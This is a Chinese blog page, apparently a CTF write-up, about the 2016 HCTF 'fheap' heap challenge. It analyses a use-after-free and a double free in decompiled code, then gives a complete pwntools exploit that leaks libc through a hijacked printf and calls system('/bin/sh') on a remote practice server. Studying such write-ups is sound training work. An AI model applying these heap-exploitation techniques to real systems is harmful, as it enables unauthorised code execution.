@@ -1,0 +1,358 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  <meta name="baidu-site-verification" content="codeva-0Qx7wvY9gP" />
+  
+  <title>『BUU』2016HCTF_fheap | C_LBY&#39;s BLOG</title>
+  <meta name="author" content="鎏柏鱼">
+  
+  <meta name="description" content="2016HCTF_fheap的其中一种解法和自己的理解">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="『BUU』2016HCTF_fheap"/>
+  <meta property="og:site_name" content="C_LBY&#39;s BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="C_LBY&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">C_LBY&#39;s BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 『BUU』2016HCTF_fheap</h1>
+		</div>
+	
+
+
+
+	<div class="row post">
+		<!-- cols -->
+		
+			<div id="top_meta"></div>
+			<div class="col-md-9">
+				
+
+							<!-- content -->
+							<div class="mypage">
+								
+									<div class="alert alert-success description">
+										<i class="fa fa-info-circle"></i> 2016HCTF_fheap的其中一种解法和自己的理解
+									</div> <!-- alert -->
+									
+
+										<h2 id="2016HCTF-fheap"><a href="#2016HCTF-fheap" class="headerlink" title="2016HCTF fheap"></a>2016HCTF fheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个程序是一个字符串管理器，程序只有两个功能，一个是create，一个是delete，有两个类似于结构体的变量，我们可以稍微优化一下伪代码。</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="type">Data</span>            struc ; (sizeof=<span class="number">0x20</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> ptr_content     dq ?</span><br><span class="line"><span class="number">00000008</span> content2_if_use dq ?</span><br><span class="line"><span class="number">00000010</span> content_len     dq ?</span><br><span class="line"><span class="number">00000018</span> ptr_free_func   dq ?</span><br><span class="line"><span class="number">00000020</span> <span class="type">Data</span>            ends</span><br><span class="line"><span class="number">00000020</span></span><br><span class="line"><span class="number">00000000</span> ; <span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> string          struc ; (sizeof=<span class="number">0x10</span>, mappedto_10)</span><br><span class="line"><span class="number">00000000</span> <span class="type">INUSE</span>           dd ?</span><br><span class="line"><span class="number">00000004</span> field_4         dd ?</span><br><span class="line"><span class="number">00000008</span> <span class="type">Data</span>            dq ?</span><br><span class="line"><span class="number">00000010</span> string          ends</span><br><span class="line"><span class="number">00000010</span></span><br></pre></td></tr></table></figure>
+
+<p>优化之后，我们来分别看一下两个函数功能。</p>
+<h5 id="create"><a href="#create" class="headerlink" title="create"></a>create</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> *<span class="title">ptr</span>;</span> <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">struct</span> Data *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give string size:&quot;</span>);</span><br><span class="line">  nbytes = read_10b();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )                       <span class="comment">// 不能超过sbrk大小</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;got elf!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )                        <span class="comment">// 长度大于15的时候才malloc</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;malloc faild!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      ptr-&gt;ptr_content = (__int64)dest;</span><br><span class="line">      ptr-&gt;ptr_free_func = (__int64)free_double_ptr;<span class="comment">// 一个free双重指针的函数指针，UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="type">char</span> *)ptr, buf, nbytesa);       <span class="comment">// 长度小于15则直接存在ptr下</span></span><br><span class="line">      ptr-&gt;ptr_free_func = (__int64)free_single_ptr;<span class="comment">// 一个free函数，UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    LODWORD(ptr-&gt;content_len) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">list</span>[i].INUSE )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">list</span>[i].INUSE = <span class="number">1</span>;                      <span class="comment">// INUSED</span></span><br><span class="line">        <span class="built_in">list</span>[i].Data = (__int64)ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )                              <span class="comment">// 最多15个chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> Data *))ptr-&gt;ptr_free_func)(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>create函数最大的特点是，只有size大于15才会申请chunk，否则直接存在ptr结构体下。所以ptr更像是一个联合体。ptr还储存了一个函数指针，用在delete函数中拿来释放chunk。可以发现这两个函数都存在UAF漏洞。另一个结构体储存了一个INUSE标志和指向ptr结构体的指针。</p>
+<h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give me the string id you want to delete\nid:&quot;</span>);</span><br><span class="line">  index = read_10b();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt;= <span class="number">0x11</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)index + <span class="number">1</span>) )<span class="comment">// ptr非空，没检查INUSED，可以DOUBLE FREE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)index + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD*)&amp;<span class="built_in">list</span>+ <span class="number">2</span> * (<span class="type">int</span>)index+ <span class="number">1</span>));</span><br><span class="line">      *((_DWORD *)&amp;<span class="built_in">list</span> + <span class="number">4</span> * (<span class="type">int</span>)index) = <span class="number">0</span>;  <span class="comment">// 将INUSED置零</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>delete函数检查了ptr位置却没有检查INUSE标志，所以可以double free。调用了函数指针指向的函数，参数是ptr结构体本身。这里很容易就想到劫持函数指针来改变程序的执行流。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果我们劫持了函数指针为system，并且在某个chunk中写入了sh，delete这个chunk就可以getshell了。但是整个程序都没有泄露地址的功能可以给我们利用，所以首先要思考的是如何获取libc地址。没有条件就自己创造条件。我们可以劫持函数指针为puts或者printf函数来泄露地址。</p>
+<p>劫持函数指针的问题很好想，可以利用fastbin的特性来劫持。程序会为每一个string申请一块0x20（实际是0x30）的堆来储存ptr结构体。如果我们先申请两块size小于15的chunk，释放掉后在申请一个0x20的chunk，通过UAF漏洞，我们就可以控制之前申请的chunk的其中一块。</p>
+<p>程序开了PIE，尽管有足够的长度写入地址，如果不知道程序基址，我们也只能写入一字节来改变函数指针。原本free函数的地址在0xD52，显然就没法用plt段中的地址了，因为我们要找到函数地址应该也满足0xDXX的形式。取而代之的，我们去找<code>call puts</code>这样的跳转指令。然后可以找到在0xD1A和0xD2D处都有，其中一个会return另一个则跳转到menu，两个都可以利用。而将他本身作为参数，delete被劫持的chunk，我们就能得到程序的基址。有了基址我们就可以利用任意地址的函数了，但是想要获得libc地址，只能将got表的地址作为参数传入puts，显然这很难实现，因为参数只能是ptr结构体地址，所以没法继续用puts函数。取代他的是printf函数，我们将格式化字符串chunk上我们就可以利用偏移来获取栈上残留的libc地址。因为有了基址，我们就可以用printf在plt段的地址了。</p>
+<p>想到这里，忽然想到一个问题，能不能如法炮制地，在某个0xDXX地址出找到一个call printf的跳转指令，这样不就不需要泄露基址也能获得libc地址了吗？好巧不巧，还真有，在0xD88处就有一个。这个指令位于delete函数中，这并不影响我们泄露地址，我们在printf完地址后，只要输入一个错误的index就可以让delete函数什么也不干直接返回menu。</p>
+<p>值得注意的是，这里存在一个栈平衡问题。如果我们直接让函数指针变成0xD88处，libc在执行printf时会检查al寄存器，如果不为零，则会执行movaps相关的指令，这个指令要求操作数16位对齐，否则程序会卡住。所以这里我们选择0xD86地址，可以将al先置零，这样可以不用理会栈平衡问题。</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在第二种思路中，唯一要调试的其实只有printf的格式化字符串偏移，找到一个合适的libc地址拿来泄露。BUU没有提供libc文件，但是说了是Ubuntu16的系统，所以大概是glibc2.23的某一个版本，所以在本地调试中patchelf了一下程序（2.23_11.3_amd64）。我们在劫持完函数指针后断点在printf处看看栈布局，找到一个__libc_start_main+240的地址在偏移176处，其实也就是__libc_start_main_ret的地址，通过远程发现依然可以获取到它，但是结果不太一样。</p>
+<p><img src="/..%5Cimages%5CBUU%5C2016HCTF_fheap%5Cprintf%E6%A0%88%E5%B8%83%E5%B1%80.png" alt="printf栈布局"></p>
+<p>这里的低三位是0x840，但实际上在远程获得的偏移是0x830。在libc database中查到多种结果，最后试得libc6_2.23-0ubuntu11_amd64才是正确版本。其实栈的前面还有很多其他的libc地址，但是本地和远程布局不太一样获取不到，所以找一个离程序起始比较近的地方去获取libc可能比较稳定。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29570</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn-f&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)  <span class="comment"># 正确的版本是libc6_2.23-0ubuntu11_amd64</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn-f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;3.quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;create &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;str:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;id is &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;3.quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;delete &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;id:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;sure?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params"><span class="built_in">breakpoint</span></span>):</span><br><span class="line">    gdb.attach(r, <span class="built_in">breakpoint</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&quot;a&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&quot;b&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;aaaa%176$pyyyy&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;c&#x27;</span>) + p8(<span class="number">0xB6</span>))  <span class="comment"># 0</span></span><br><span class="line">dbg(<span class="string">&#x27;b *printf&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">libc_start_main_ret_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;yyyy&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret_addr-<span class="number">0x20830</span>  <span class="comment"># 本地要-0x10</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x45390</span>  <span class="comment"># 本地要+0x10</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;sys_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 跳过delete函数</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">24</span>, <span class="string">b&quot;p&quot;</span>) + p64(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>似乎还有其他的打法，可以参考下面的链接</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shangye/p/6156391.html">官方解法</a></li>
+<li><a target="_blank" rel="noopener" href="https://lantern.cool/wp-item-HCTF-2016-fheap/">Lantern师傅的解法</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33528164/article/details/79515831">比较详细的WP</a></li>
+</ul>
+
+											<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
+        国际许可协议(CC BY-NC-SA 4.0) 发布.</a></br>
+    因本人技术水平和知识面有限, 内容如有纰漏或者需要修正的地方, 欢迎大家指正。转载请注明来自<a href="https://c-lby.github.io" target="_blank">C_LBY's blog</a>！
+</div>
+							</div>
+
+							
+									
+										<span data-path="/2024/03/28/2016HCTF-fheap/">
+											<em class="post-meta-item-text"> Page View <i
+													class="waline-pageview-count"></i></em>
+										</span>
+
+										
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/03/05/pwnable-WP/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+											
+													
+														<section id="comments" class="comments">
+															<!-- <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+  var walineConfig = 
+    walineConfig.el='#waline';
+  Waline.init(walineConfig);
+</script> -->
+
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+  init({
+    enable: true,
+    el: '#waline',
+    serverURL: 'https://blog-s-comment-three.vercel.app',
+    dark: true,
+    pageview: true,
+    lang: 'zh-CN',
+    requiredMeta: ['nick', 'mail'],
+    locale:
+      { placeholder: 'Say something……' },
+    highlighter: true,
+    search: false,
+    emoji: [
+      '//unpkg.com/@waline/emojis@1.2.0/weibo',
+      '//unpkg.com/@waline/emojis@1.2.0/bmoji',
+      '//unpkg.com/@waline/emojis@1.2.0/bilibili',
+      'https://unpkg.com/@waline/emojis@1.2.0/qq',
+    ],
+    imageUploader: false,
+  });
+</script>
+														</section>
+														
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+					
+						<div id="side_meta">
+							<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-28 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/WP/">WP<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>6</span></a></li> <li><a href="/tags/PWN/">PWN<span>6</span></a></li> <li><a href="/tags/WP/">WP<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2016HCTF-fheap"><span class="toc-article-text">2016HCTF fheap</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90"><span class="toc-article-text">分析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#create"><span class="toc-article-text">create</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#delete"><span class="toc-article-text">delete</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-article-text">思路</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-article-text">调试</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#EXP"><span class="toc-article-text">EXP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">参考链接</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+
+
+						</div>
+
+						
+
+			</div><!-- row -->
+
+			<!--
+ -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+    &copy; 2024
+      鎏柏鱼's Blog
+        
+                powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by <a
+                  href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
